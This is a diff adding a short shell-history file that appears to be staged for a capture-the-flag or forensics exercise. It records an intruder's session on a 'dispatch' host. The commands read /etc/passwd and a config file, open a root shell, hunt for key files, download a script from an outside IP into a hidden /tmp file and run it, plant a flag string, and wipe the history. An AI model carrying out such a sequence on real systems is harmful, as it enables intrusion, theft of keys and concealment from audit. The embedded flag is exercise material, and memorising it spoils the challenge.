@@ -1,0 +1,26 @@
+whoami
+hostname
+cat /etc/hostname
+ls -la /var/log/
+cat /etc/passwd | grep dispatch
+id
+sudo -l
+sudo bash
+cd /var/log
+tail -n 50 auth.log
+grep -c Failed auth.log
+netstat -tulpn | grep LISTEN
+ps aux | grep dispatch
+crontab -l
+ls -la /opt/
+cd /opt/dispatch
+ls
+cat config.ini
+find / -name '*.key' 2>/dev/null
+curl -s http://185.220.101.47:8443/agent.sh -o /tmp/.cache-agent
+chmod +x /tmp/.cache-agent
+/tmp/.cache-agent --check
+echo 'marqueur de session attaquant'
+echo "UHACK{p0rt3_3ntr33_p4r_f0rc3_brut3}" > /dev/shm/.sync_status
+chmod 400 /dev/shm/.sync_status
+history -c; exit
